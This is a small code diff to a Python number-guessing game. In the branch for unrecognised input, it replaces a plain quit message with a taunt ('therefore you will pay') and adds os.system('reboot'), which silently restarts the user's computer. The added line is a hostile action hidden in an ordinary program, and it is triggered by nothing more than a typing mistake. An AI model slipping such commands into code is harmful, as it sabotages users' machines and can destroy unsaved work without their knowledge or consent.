@@ -20,7 +20,8 @@ def game():
             print("quitting")
             quit()
         else:
-            print("did not reckognize input quitting.")
+            print("did not reckognize input quitting therefore you will pay")
+            os.system('reboot')
             quit()
             
     elif int (num1) != int (num2):
